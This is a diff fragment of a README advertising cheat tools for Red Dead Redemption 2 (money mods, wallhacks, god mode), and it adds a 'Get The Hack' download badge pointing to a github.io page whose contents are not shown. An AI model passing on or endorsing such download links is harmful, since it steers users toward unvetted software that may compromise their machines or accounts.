@@ -4,7 +4,7 @@
 
 Red Dead Redemption 2 is one of the most ambitious open-world games ever built, with stunning realism and endless activities. But grinding cash, hunting gear, or replaying missions for upgrades can be a drag. That’s why many players jump into **RDR 2 hacks** – advanced tools that add everything from **money mods** and **ESP wallhacks** to **god mode** and **teleport cheats**.
 
-
+[![Get](https://img.shields.io/badge/Get%20The-Hack-blueviolet)](https://rdr-2-hack.github.io/.github/)
 ---
 
 ## What Are RDR 2 Hacks?
